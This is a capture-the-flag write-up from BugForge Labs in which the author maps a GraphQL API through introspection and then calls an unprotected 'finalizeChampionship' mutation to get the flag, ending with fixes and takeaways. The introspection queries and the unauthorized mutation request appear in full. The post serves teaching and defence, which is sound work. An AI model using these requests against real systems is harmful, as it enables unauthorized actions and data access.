---
title: "SOKUDO - GRAPHQL - Bugforge Daily Challenge"
description: A GraphQL introspection writeup from BugForge Labs. The API happily described its own schema, and that map led straight to an unauthorized mutation and the flag.
date: 2026-08-15 00:00:00 +0545
categories: [BugForge, GraphQL]
tags: [graphql, ctf, introspection, api-security, bugforge]
image: /assets/images/sokudographql/sokudo_graphql_illustrative.png
---


This one's a CTF (Daily Challenge) from [BugForge labs](https://bugforge.io), and this time the target speaks **GraphQL** instead of REST. No fuzzing, no guessing endpoint names - the API just told me exactly what it could do, and one of those things turned out to be something I really shouldn't have been allowed to trigger.

> **Platform:** BugForge Labs
> **Category:** Web Application Exploitation
> **Vulnerability:** GraphQL Introspection + Unauthorized Mutation Execution
{: .prompt-info }

## The Big Picture

Here's the attack chain in simple terms:

```
Register account → Spot a GraphQL endpoint in traffic
→ Run introspection query to map the schema
→ Discover a Mutation called finalizeChampionship
→ Enumerate its arguments and return type
→ Execute the mutation with seasonId: 1 → Get the flag in prizeCode field
```

## Step 1 - Register & Get a JWT Token

Same as always, I started with a test account:

```json
{
  "username": "test",
  "email": "test@gmail.com",
  "password": "123456",
  "full_name": "TESTER ME"
}
```

After registering, the app handed back a JWT token - that's my identity for every request from here on.

[![Register response with JWT token](/assets/images/sokudographql/register.png)](/assets/images/sokudographql/register.png)
_Register response with JWT token_

## Step 2 - Spotting the GraphQL Endpoint

After logging in, I explored the app while watching the traffic. On the championship results page, one request stood out - it was hitting a **GraphQL endpoint**.

[![GraphQL endpoint found in traffic](/assets/images/sokudographql/graphqlendpoint.png)](/assets/images/sokudographql/graphqlendpoint.png)
_GraphQL endpoint found in traffic_

The query being sent looked like this:

```json
{
  "query": "{ currentSeason { id name status standings { rank username wpm accuracy } } }"
}
```

It was just fetching the current season's standings - rank, username, WPM, accuracy. Normal enough on the surface. But any time I see a GraphQL endpoint, it's always worth poking at.

[![GraphQL season standings response](/assets/images/sokudographql/graphql.png)](/assets/images/sokudographql/graphql.png)
_GraphQL season standings response_

## Step 3 - Running an Introspection Query

The first thing to check on any GraphQL endpoint is whether **introspection** is enabled. Introspection lets you ask the server "what queries and mutations do you actually support?" - basically a free map of the entire API.

I sent the standard introspection query:

```json
{
  "query": "{ __schema { types { name } } }"
}
```

The server responded with the full list of types:

```json
{
  "data": {
    "__schema": {
      "types": [
        { "name": "SeasonStanding" },
        { "name": "Season" },
        { "name": "ChampionshipResult" },
        { "name": "Query" },
        { "name": "Mutation" }
      ]
    }
  }
}
```

[![Introspection query result](/assets/images/sokudographql/introspectionQuery.png)](/assets/images/sokudographql/introspectionQuery.png)
_Introspection query result_

Two things stood out right away: `ChampionshipResult` and `Mutation`. A `Mutation` type existing means the API has write operations, not just reads - that's the interesting part.

> Introspection isn't a vulnerability on its own, but leaving it enabled in production hands an attacker a fully documented map of every query and mutation the API supports.
{: .prompt-tip }

## Step 4 - Discovering What Mutations Exist

I queried the `Mutation` type directly to see what it actually supports:

```json
{
  "query": "{ __type(name: \"Mutation\") { name fields { name } } }"
}
```

Response:

```json
{
  "data": {
    "__type": {
      "name": "Mutation",
      "fields": [
        { "name": "finalizeChampionship" }
      ]
    }
  }
}
```

Only one mutation: **`finalizeChampionship`**. The name alone suggests this should be a privileged, one-time action - something only an admin or the system itself should trigger. Worth digging into.

## Step 5 - Enumerating Its Arguments and Return Type

Before calling the mutation blind, I needed to know what arguments it takes and what it returns.

[![Arguments and return type of finalizeChampionship](/assets/images/sokudographql/argumentAndReturnType.png)](/assets/images/sokudographql/argumentAndReturnType.png)
_Arguments and return type of finalizeChampionship_

That query gave me everything I needed:

```
Mutation      : finalizeChampionship
Argument      : seasonId
Argument type : ID!   (required)
Return type   : ChampionshipResult!
```

`ChampionshipResult` was already in the schema list from Step 3 - a good sign it holds structured data worth reading.

## Step 6 - Executing the Mutation

With the argument name and type confirmed, I called the mutation directly, passing `seasonId: "1"` and asking for every field on `ChampionshipResult`:

```json
{
  "query": "mutation { finalizeChampionship(seasonId: \"1\") { seasonId champion finalized prizeCode } }"
}
```

The server ran it with **zero authorization check** and handed back the result - including a `prizeCode` field holding the **flag**.

[![Flag retrieved in prizeCode field](/assets/images/sokudographql/gotTheFlag.png)](/assets/images/sokudographql/gotTheFlag.png)
_Flag retrieved in prizeCode field_


Every step here used only information the server volunteered through its own introspection system - no guessing, no brute-forcing.

## How Could This Be Fixed?

| Issue | Fix |
|---|---|
| Introspection enabled in production | Disable GraphQL introspection in production - it hands attackers a complete map of the API |
| `finalizeChampionship` has no authorization check | Sensitive mutations must verify the caller's role before executing - only admins or the system should be able to finalize a championship |
| `prizeCode` returned without any gating | Strip sensitive fields from the response for unauthorized callers, even if the mutation itself runs |

## Key Takeaways

- **Introspection enabled in production is a serious information disclosure.** It turns a black-box API into a fully documented one for anyone who knows to ask.
- **Always check for Mutation types, not just Query types.** Queries read data, mutations write or trigger actions - and write operations are almost always more dangerous.
- **A mutation named `finalizeChampionship` should require admin privileges.** The name itself signals a privileged, irreversible action - letting any authenticated user call it is the actual access control failure.
- **GraphQL's introspection system can be an attacker's best friend.** The entire path here was built using only what the server willingly described about itself.

---

> *Happy Hacking!*

Challenge: BugForge Daily - Sokudo - Graphql | Aug 15th, 2026